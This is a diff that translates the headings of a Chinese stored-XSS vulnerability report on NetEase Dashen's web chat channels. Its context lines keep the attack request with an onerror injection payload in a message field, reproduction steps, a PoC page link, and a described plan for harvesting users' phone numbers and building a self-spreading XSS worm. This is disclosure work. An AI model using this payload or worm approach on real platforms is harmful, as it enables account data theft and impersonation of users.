@@ -5,22 +5,22 @@ date:   2023-10-19 10:26:18 +0800
 categories: xss
 ---
 
-## 漏洞名称
+## Name
 
 > 网易大神Web端频道签到消息存在存储型XSS漏洞
 
-## 漏洞类型
-> web漏洞，存储型XSS
+## Weakness
+> 存储型XSS
 
-## 危害等级
+## Severity
 > 高危
 
-## 漏洞URL
+## URL
 - POST https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg
 - POC网页 https://ds.163.com/channel/0149881854/1459481/ 打开后在终端打印111222233
 - 视频链接：链接：https://pan.baidu.com/s/1468B0QCK8zEIu7MtIVb4CQ 提取码：1314
 
-## 关键数据包
+## Key Payload
 
     POST /v1/web/chat-room-msg/send-msg HTTP/1.1
     Host: inf-im.ds.163.com
@@ -50,13 +50,13 @@ categories: xss
     { "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": [{ "type": "TITLE", "data": { "banner": "", "icon": "https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870", "atUser": "@灯中烛火", "text": "签到成功！" }, "order": 0.0 }, { "type": "TEXT", "data": "<img src=x onerror=console.log(2222233)>", "order": 1.0 }, { "type": "BUTTON", "data": [{ "text": "立即抽奖", "action": { "type": "OPEN_URL", "data": "https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+" } }], "order": 2.0 }], "contentType": "IMAGE_TEXT_TEMPLATE" }
 
 
-## 漏洞描述
+## Summary
 网易大神web版中，聊天频道发布签到消息(IMAGE_TEXT_TEMPLATE)时，没有对签到的内容进行过滤，而是直接将签到内容赋值给innerHTML，直接造成存储型XSS攻击。
 
-### 详细说明
+### Detail
 请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情
 
-#### 漏洞触发
+#### Trigger
 1. 登录大神Web平台 https://ds.163.com/
 2. 进入频道，选择任意频道测试发消息，例如进入测试频道 https://ds.163.com/channel/0149881871/1459515/
 发消息测试，并且通过burpsuite观察请求包结构
@@ -190,7 +190,7 @@ categories: xss
 - 伪造发送消息等
 前面通过脚本发送合法请求，已经足够证明攻击者能伪造用户发送消息。只需要把该脚本上传到https服务器，并且通过xss payload下载恶意脚本，能够执行更加复杂的逻辑。
 
-### 漏洞证明
+### Proof
 请提供截图或视频
 视频链接：链接：https://pan.baidu.com/s/1468B0QCK8zEIu7MtIVb4CQ 提取码：1314
 完整利用脚本如下：
@@ -296,11 +296,11 @@ categories: xss
         }
 
 
-## 漏洞危害
+## Impact
 该漏洞影响网页端所有聊天频道，注意到每个游戏频道都有几十上百万用户，影响深远。用户只要进入聊天界面，无需任何操作就能够遭受攻击。
 1. 攻击者可以在聊天群直接嵌入XSS，无需受害者进行操作，能够大规模收集平台用户手机号和账号信息，造成敏感信息泄漏；
 2. 攻击者可以在聊天群直接嵌入XSS，无需受害者进行操作，能够伪造用户发消息等，制造XSS蠕虫，实现XSS帖子的自我复制，扩大影响。
 
-## 修复建议
+## Patch advice
 1. 对签到的内容进行过滤，而非直接复杂给innerHTML
 
